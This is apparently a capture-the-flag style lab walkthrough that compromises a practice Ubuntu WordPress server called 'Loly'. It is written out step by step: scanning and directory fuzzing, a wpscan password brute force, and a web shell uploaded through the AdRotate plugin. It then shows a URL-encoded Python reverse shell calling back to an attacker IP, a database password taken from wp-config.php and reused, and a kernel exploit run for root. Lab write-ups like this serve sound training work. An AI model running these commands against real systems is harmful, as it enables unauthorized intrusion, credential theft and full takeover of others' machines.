## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.115.121
# HOSTNAME // Found Post Initial foothold
ubuntu
# OPERATING SYSTEM // Found Post Initial foothold
PRETTY_NAME="Ubuntu 16.04.1 LTS"
# CREDENTIALS   // Found Post Initial foothold
lolyisabeautifulgirl
```
## OPEN PORTS DETAILS
```bash
80/tcp open  http    syn-ack ttl 61 nginx 1.10.3 (Ubuntu)
```
# ENUMERATION
## PORT 80
```bash
# Recon
Server: nginx/1.10.3 (Ubuntu)
# Tools used
sudo whatweb -v $url

# Fuzz 
wordpress               [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 37ms]
# Tools used
sudo ffuf -c -w /usr/share/wordlists/dirb/common.txt -of md -o fuzz/ffuf-common -fc 403,404 -u $url/FUZZ

# Found hostname - From source code
loly.lc
- Add to /etc/hosts file
- Possible username loly

# Wpscan 
- Found username loly
- WordPress version 5.5
- WordPress theme in use: feminine-style, twentynineteen, twentyseventeen, twentytwenty, virtue
- Plugins: adrotate Version: 5.8.6.2
- [SUCCESS] - loly / fernando 
# Commands used
sudo wpscan --url $url -e u
sudo wpscan --url $url/wordpress -e u
sudo wpscan --url $url/wordpress -e p
sudo wpscan --url $url/wordpress -e t
sudo wpscan --url $url/wordpress -U loly -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
```
## INITIAL FOOTHOLD
```bash
# Found Adrotate Plugin exploit
# Source - https://github.com/jephk9/oscp-jewels/blob/main/services/wordpress-plugin-exploits.md
- POC
# can upload shell as zip as image banner
# banner images are auto extracted to /banner folder
# use plugin settings to find where the /banner folder is
# mostly /var/www/html/wordpress/wp-content/banners
wp-content/banners/web.php

- Upload plugin-shell.zip
sudo cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
sudo zip plugin-shell.zip plugin-shell.php

- Web Shell
http://loly.lc/wordpress/wp-content/banners/plugin-shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 

- Proper shell
http://loly.lc/wordpress/wp-content/banners/plugin-shell.php?cmd=which%20python3
http://loly.lc/wordpress/wp-content/banners/plugin-shell.php?cmd=export%20RHOST=%22192.168.45.240%22;export%20RPORT=80;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
```
## PRIVILEGE ESCALATION
```bash
# Found creds
/var/www/html/wordpress/wp-config.php
- lolyisabeautifulgirl

# user shell
su loly
lolyisabeautifulgirl

# Privesc
loly@ubuntu:/var/www/html/wordpress$ uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
loly@ubuntu:/var/www/html/wordpress$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.1 LTS"
NAME="Ubuntu"
VERSION="16.04.1 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.1 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial


# Found Kernel Exploit
https://www.exploit-db.com/exploits/45010
- Transfer cve-2017-16995.c
gcc cve-2017-16995.c -o cve-2017-16995
./cve-2017-16995

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Wed Feb  5 05:57:12 2025 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.115.121
Nmap scan report for 192.168.115.121
Host is up, received echo-reply ttl 61 (0.039s latency).
Scanned at 2025-02-05 05:57:15 IST for 21s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  5 05:57:36 2025 -- 1 IP address (1 host up) scanned in 23.98 seconds
```

